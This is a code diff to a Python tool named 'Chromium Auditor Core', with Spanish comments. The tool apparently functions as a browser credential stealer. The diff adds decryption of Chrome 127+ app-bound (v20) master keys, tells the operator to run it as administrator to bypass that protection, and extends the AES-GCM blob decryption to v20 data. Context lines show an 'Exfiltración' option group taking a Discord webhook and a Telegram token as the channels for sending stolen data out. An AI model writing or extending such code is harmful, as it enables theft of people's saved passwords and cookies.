@@ -303,9 +303,31 @@ class ChromiumDecryptor:
             logger.warning(f"Error leyendo Local State ({user_data_path}): {e}")
             return None, dpapi_available
 
+        app_bound_b64 = config.get("os_crypt", {}).get("app_bound_encrypted_key")
+        if app_bound_b64 and win32crypt:
+            # Verificar privilegios de administrador para V20
+            is_admin = False
+            try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            except: pass
+            
+            if not is_admin:
+                logger.warning("!!! DETECTADA LLAVE V20 (Chrome 127+). REQUIERE EJECUTAR COMO ADMINISTRADOR PARA DESCIFRAR !!!")
+
+            try:
+                import importlib
+                v20_module = importlib.import_module('chrome_v20_decryption.v20_decryptor')
+                aes_key = v20_module.get_v20_key(app_bound_b64, win32crypt)
+                if aes_key:
+                    logger.debug(f"Master key AES (v20) obtenida ({len(aes_key)} bytes) para: {user_data_path}")
+                    return aes_key, True
+            except Exception as e:
+                logger.debug(f"Fallback desde v20. Error: {e}")
+
         encrypted_key_b64 = config.get("os_crypt", {}).get("encrypted_key")
-        if not encrypted_key_b64:
-            logger.debug(f"No hay os_crypt.encrypted_key en: {user_data_path}")
+        if not encrypted_key_b64 and not app_bound_b64:
+            logger.debug(f"No hay llaves validas en os_crypt para: {user_data_path}")
+            return None, dpapi_available
+        elif not encrypted_key_b64:
             return None, dpapi_available
 
         try:
@@ -344,10 +366,12 @@ class ChromiumDecryptor:
         if not blob:
             return ""
 
-        # ── AES-GCM (Chromium v80+, prefijo v10 o v11) ───────────────────────
-        if blob[:3] in (b"v10", b"v11"):
+        # ── AES-GCM (Chromium v80+, prefijo v10, v11, o v20) ───────────────────
+        if blob[:3] in (b"v10", b"v11", b"v20"):
             if not aes_key:
                 logger.debug("Blob AES-GCM sin llave disponible")
+                if blob.startswith(b"v20"):
+                    return "[Admin Required for v20]"
                 return "[Sin Llave AES]"
 
             if len(blob) < 3 + 12 + 16:      # mínimo viable: prefijo + nonce + tag vacío
@@ -544,7 +568,7 @@ class ChromiumDecryptor:
         return (data + filtered), h_p, c_p
 
 def main():
-    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}")
+    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}\n\n[IMPORTANTE] Para soporte V20 (Chrome v127+), REQUIERE EJECUTAR COMO ADMINISTRADOR.", formatter_class=argparse.RawTextHelpFormatter)
     ex = parser.add_argument_group("Exfiltración")
     ex.add_argument("--webhook", help="Discord Webhook")
     ex.add_argument("--tg-token", help="Telegram Token")
